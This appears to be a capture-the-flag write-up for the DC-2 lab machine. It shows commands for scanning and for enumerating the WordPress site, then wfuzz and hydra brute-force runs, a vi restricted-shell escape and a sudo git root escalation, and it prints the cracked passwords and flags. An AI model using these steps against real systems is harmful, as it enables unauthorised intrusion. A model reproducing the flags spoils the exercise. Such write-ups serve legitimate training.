---
description: >-
  This is a free linux, proving grounds machine, you can also download it from
  vulhub.
---

# DC-2

### NMAP

```shell
nmap -sV -sC -T4 -p- -oN nmap_dc2 192.168.237.194  192.168.161.194
```

```markdown
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-19 05:44 EAT
Warning: 192.168.237.194 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.237.194
Host is up (0.19s latency).
Not shown: 65322 closed tcp ports (conn-refused), 211 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Did not follow redirect to http://dc-2/
|_http-server-header: Apache/2.4.10 (Debian)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### http Enumeration(port 80)

On scanning our machine with feroxbuster we see that it has a **WordPress** website present but before the website opens you have to first set the **dc-2** domain in the **/etc/hosts** file.

```markdown
sudo mousepad /etc/hosts
192.168.186.194 dc-2
```

FEROXBUSTER

```shell
feroxbuster -u http://192.168.186.194 -x html,php,txt,js
```

!\[\[dc2-1.png]]

Attacking a WordPress website

```shell
wpscan --url http://dc-2 -e ap,u
```

!\[\[dc-2.png]]

After scanning the site we see it uses "**WordPress version 4.7.10**" and we see two users **admin** , **jerry** and **Tom** Now we going to try to do a bruteforce attack to the login form, with the use of **cewl** is generated a customised password list from the site ans saved it in has password.txt.

```shell
cewl -w password.txt http://dc-2
```

On attacking the users we get the password of Tom

```shell
1. wpscan --url http://dc-2 -U users.txt -P password.txt
2. wfuzz -c --hc=200 -z file,users.txt -z file,password.txt -d 'log=FUZZ&pwd=FUZ2Z&wp-submit=Log+In' http://dc-2/wp-login.php
```

!\[\[tom.png]]

### Gaining Access

Username: tom, Password: parturient

since i have tom's creds, let me try to login with ssh

```shell
ssh tom@dc-2 -p 7744
```

!\[\[ssh-1.png]]

I tried cat local.txt and it failed and also tried to see if python is present so i could change from the restricted shell, i tried to run vi on the file and surprisingly it works and managed to get the flag for tom.

```shell
1. vi local.txt
4c634c9733613be583cf6dbf152c80ee
```

i used vi to escapt to restricted shell, with some research i found [here](http://linuxshellaccount.blogspot.com/2008/05/restricted-accounts-and-vim-tricks-in.html) and after you set a $PATH

```shell
export PATH=/bin:/usr/bin:$PATH
```

after you set a $PATH you can see that your cat command now works, when you open flag3.txt has a message for us to su to jerry

!\[\[dc2-3.png]]

Finding jerry's password

```shell
hydra -l jerry -P password.txt ssh://dc-2:7744 -v
```

the password for jerry is "adipiscing"

### privilege escalation

!\[\[je.png]]

user jerry can run /usr/bin/git as admin, when you got [GTFObin](https://gtfobins.github.io/gtfobins/git/) and you search for git, you will see how to get a root shell

```shell
sudo /usr/bin/git -p help config
```

This command invokes the default pager, which is likely to be [`less`](https://gtfobins.github.io/gtfobins/less/), other functions may apply then try to search for strings in it with this command and you will get a root shell

```
!/bin/bash
```

!\[\[dc2-4.png]]

change to a root parental directory for the last flag

!\[\[final.png]]

```shell
1. cd proof.txt
e255f15b0d603f4942af0b1461c2aad6
```
